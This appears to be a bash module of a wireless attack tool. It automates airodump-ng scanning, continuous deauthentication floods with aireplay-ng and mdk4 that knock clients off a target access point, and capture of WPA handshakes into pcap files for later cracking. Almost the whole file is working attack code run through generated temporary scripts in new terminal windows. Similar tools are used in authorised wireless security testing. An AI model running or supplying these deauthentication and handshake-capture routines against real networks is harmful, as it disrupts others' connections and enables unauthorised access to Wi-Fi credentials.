#!/bin/bash

open_terminal() {
    local title="$1" cmd="$2"
    if   command -v xterm         &>/dev/null; then
        xterm -bg black -fg cyan -title "$title" -e "bash -c '$cmd; echo Press\ Enter\ to\ close; read'" &
    elif command -v gnome-terminal &>/dev/null; then
        gnome-terminal --title="$title" -- bash -c "$cmd; echo 'Press Enter to close'; read" &
    elif command -v xfce4-terminal &>/dev/null; then
        xfce4-terminal --title="$title" -e "bash -c '$cmd; echo Press\ Enter\ to\ close; read'" &
    elif command -v konsole        &>/dev/null; then
        konsole --title "$title" -- bash -c "$cmd; echo 'Press Enter to close'; read" &
    else
        err "No terminal emulator found — install xterm"; return 1
    fi
}

asktime () {

	while true; do
	info "Scan timing would be better if above 30sec"
	read -rp "$(printf "%s Scanning & Deauth Time... %s\t" "${BLUE_DIM}" "${NC}")" sec	
    if [[ -z $sec || $sec -ge 180  || ! $sec =~ ^[0-9]+$ || $sec -le 20 ]]; then
		warn "Scan time must be a number greater than 20 and less then 180 sec"
		enter
	else 
        break
    fi
    done
}

scan_airodump() {
	while true; do
	info "Scan timing would be better if above 30sec"
	read -rp "$(printf "%s Scanning Time... %s\t" "${BLUE_DIM}" "${NC}")" sec	
    if [[ -z $sec || $sec -ge 60  || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
		warn "Scan time must be a number greater than 0 and less then 60 sec"
		enter
	else 
        break
    fi
    done
	warn "Press Ctrl+C here to stop scan"

    local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script" <<EOF
#!/bin/bash
timeout $sec airodump-ng $INTERFACE --write scan --output-format csv &

echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script"
    open_terminal "Scan" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid 2>/dev/null)
	if [[ -z $readdata ]]; then
    	err "Scan Failed"
    	return 1
	fi

	trap 'info "Interuptted"; break' INT

	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    kill -0 "$readdata" 2>/dev/null || { err "Windows Closed early"; break; }
    	sleep 2
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	rm -f "$script" "$pid"
}

scan_handshake() {
	asktime
	warn "Pressing Ctrl+C or stopping capture will return in failure"

    local script1
    script1="/tmp/term_$$_${RANDOM}.sh"
	local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid1
    pid1="/tmp/term_$$_${RANDOM}.pid"
	local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script1" <<EOF
#!/bin/bash
	timeout $sec airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE &
echo \$! > "$pid1"
wait
rm -f $pid1
EOF

	cat > "$script" <<EOF
#!/bin/bash
	timeout $(( sec - 10 )) aireplay-ng --deauth 0 -a $ap $INTERFACE --ignore-negative-one &
echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script1" "$script"
    open_terminal "Capturing" "bash $script1"
	open_terminal "Deauth" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid1 2>/dev/null)
	if [[ -z $readdata ]]; then
	    err "Capturing Failed"
	    return 1
	fi
	local readata
	readata=$(cat $pid 2>/dev/null)
	if [[ -z $readata ]]; then
	    err "Deauth Failed"
	    return 1
	fi

	trap 'info "Interuptted"; break' INT
	
	secs=$(( sec - 10 ))
	local times=$(( SECONDS + secs ))
	while (( SECONDS < times )); do
    	# deauth ending on its own isn't fatal — capture might still get the handshake
	    if ! kill -0 "$readata" 2>/dev/null; then
        	info "Deauth Finished (capture still running)"
        	break
    	fi
	done
	
	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    if ! kill -0 "$readdata" 2>/dev/null; then
        	info "Capture terminal closed"
        	break
    	fi
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	sudo pkill -P "$readata" 2>/dev/null
	sudo kill "$readata" 2>/dev/null
	rm -f "$script1" "$script" "$pid1" "$pid"
}

scan_handshake1() {
	asktime
	warn "Pressing Ctrl+C or stopping capture will return in failure"

    local script1
    script1="/tmp/term_$$_${RANDOM}.sh"
	local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid1
    pid1="/tmp/term_$$_${RANDOM}.pid"
	local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script1" <<EOF
#!/bin/bash
	timeout $sec airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE &
echo \$! > "$pid1"
wait
rm -f $pid1
EOF

	cat > "$script" <<EOF
#!/bin/bash
	timeout $(( sec - 10 )) aireplay-ng --deauth 0 -a $ap -c $cp $INTERFACE --ignore-negative-one &
echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script1" "$script"
    open_terminal "Capturing" "bash $script1"
	open_terminal "Deauth" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid1 2>/dev/null)
	if [[ -z $readdata ]]; then
	    err "Capturing Failed"
	    return 1
	fi
	local readata
	readata=$(cat $pid 2>/dev/null)
	if [[ -z $readata ]]; then
	    err "Deauth Failed"
	    return 1
	fi

	trap 'info "Interuptted"; break' INT
	
	secs=$(( sec - 10 ))
	local times=$(( SECONDS + secs ))
	while (( SECONDS < times )); do
    	# deauth ending on its own isn't fatal — capture might still get the handshake
	    if ! kill -0 "$readata" 2>/dev/null; then
        	info "Deauth Finished (capture still running)"
        	break
    	fi
	done
	
	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    if ! kill -0 "$readdata" 2>/dev/null; then
        	info "Capture terminal closed"
        	break
    	fi
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	sudo pkill -P "$readata" 2>/dev/null
	sudo kill "$readata" 2>/dev/null
	rm -f "$script1" "$script" "$pid1" "$pid"
}

validate_digit () {
	local value=$1
	if [[ ! $value =~ ^[0-9]+$ ]]; then
		err "Enter a valid number"
		return 1
	fi
	return 0
}

mdk4_handshake() {
	info "Sometime MDK4 deauth starts late so give atleast 30+ sec."
	asktime
	warn "Pressing Ctrl+C or stopping capture will return in failure"

    local script1
    script1="/tmp/term_$$_${RANDOM}.sh"
	local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid1
    pid1="/tmp/term_$$_${RANDOM}.pid"
	local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script1" <<EOF
#!/bin/bash
	timeout $sec airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE &
echo \$! > "$pid1"
wait
rm -f $pid1
EOF

	cat > "$script" <<EOF
#!/bin/bash
	timeout $(( sec - 10 )) mdk4 $INTERFACE d -B $ap -c $ch &
echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script1" "$script"
    open_terminal "Capturing" "bash $script1"
	open_terminal "Deauth" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid1 2>/dev/null)
	if [[ -z $readdata ]]; then
	    err "Capturing Failed"
	    return 1
	fi
	local readata
	readata=$(cat $pid 2>/dev/null)
	if [[ -z $readata ]]; then
	    err "Deauth Failed"
	    return 1
	fi

	trap 'info "Interuptted"; break' INT
	
	secs=$(( sec - 10 ))
	local times=$(( SECONDS + secs ))
	while (( SECONDS < times )); do
    	# deauth ending on its own isn't fatal — capture might still get the handshake
	    if ! kill -0 "$readata" 2>/dev/null; then
        	info "Deauth Finished (capture still running)"
        	break
    	fi
	done
	
	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    if ! kill -0 "$readdata" 2>/dev/null; then
        	info "Capture terminal closed"
        	break
    	fi
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	sudo pkill -P "$readata" 2>/dev/null
	sudo kill "$readata" 2>/dev/null
	rm -f "$script1" "$script" "$pid1" "$pid"
}

aireplay_deauth() {

	warn "Press Ctrl+C here to stop Deauth"

    local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script" <<EOF
#!/bin/bash
	if [[ -z "$cp" ]]; then
		aireplay-ng --deauth $pac -a $ap $INTERFACE --ignore-negative-one &
	else
		aireplay-ng --deauth $pac -a $ap -c $cp $INTERFACE --ignore-negative-one &
	fi
echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script"
    open_terminal "Scan" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid 2>/dev/null)
	if [[ -z $readdata ]]; then
    	err "Scan Failed"
    	return 1
	fi

	trap 'info "Interuptted"; break' INT

	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    kill -0 "$readdata" 2>/dev/null || { err "Windows Closed early"; break; }
    	sleep 2
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	rm -f "$script" "$pid"
}

mdk4_deauth() {
	
	while true; do
	read -rp "$(printf "%sDeauth Time... %s\t" "${BLUE_DIM}" "${NC}")" sec	
    if [[ -z $sec || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
		warn "Scan time must be a number greater than 0"
		enter
	else 
        break
    fi
    done
	warn "Press Ctrl+C here to stop Deauth"

    local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script" <<EOF
#!/bin/bash
	timeout $sec mdk4 $INTERFACE d -B $ap -c $ch &

echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script"
    open_terminal "Scan" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid 2>/dev/null)
	if [[ -z $readdata ]]; then
    	err "Scan Failed"
    	return 1
	fi

	trap 'info "Interuptted"; break' INT

	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    kill -0 "$readdata" 2>/dev/null || { err "Windows Closed early"; break; }
    	sleep 2
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	rm -f "$script" "$pid"
}